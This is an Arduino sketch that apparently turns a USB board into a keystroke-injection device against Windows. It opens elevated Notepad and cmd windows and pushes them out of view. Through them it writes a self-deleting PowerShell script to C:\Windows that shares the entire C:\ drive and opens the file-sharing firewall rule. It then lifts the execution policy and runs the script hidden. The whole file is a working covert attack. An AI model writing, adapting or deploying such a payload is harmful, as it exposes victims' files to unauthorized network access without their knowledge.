#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // start keyboard stream
  Keyboard.begin();

  delay(500); //500 = time to wait 

  delay(750);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("powershell Start-Process notepad -Verb runAs");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(750);

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("m");

  delay(1000);

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  Keyboard.print("$Share = [WmiClass]'Win32_Share'");

  typeKey(KEY_RETURN);

  Keyboard.print("$Share.Create('C:\\', 'netShare', 0)");

  typeKey(KEY_RETURN);

  Keyboard.print("netsh advfirewall firewall set rule group=\\\"File and Printer Sharing\\\" new enable=Yes");

  typeKey(KEY_RETURN);

  Keyboard.print("Remove-Item $MyINvocation.InvocationName");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("C:\\Windows\\config-61531.ps1");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(750);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(750);

  Keyboard.print("powershell Start-Process cmd -Verb runAs");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("mode con:cols=14 lines=1");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(750);

  Keyboard.print("m");

  delay(750);

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  Keyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("powershell.exe -windowstyle hidden -File C:\\Windows\\config-61531.ps1");

  typeKey(KEY_RETURN);

  // stream end
  Keyboard.end();
}

void loop() {}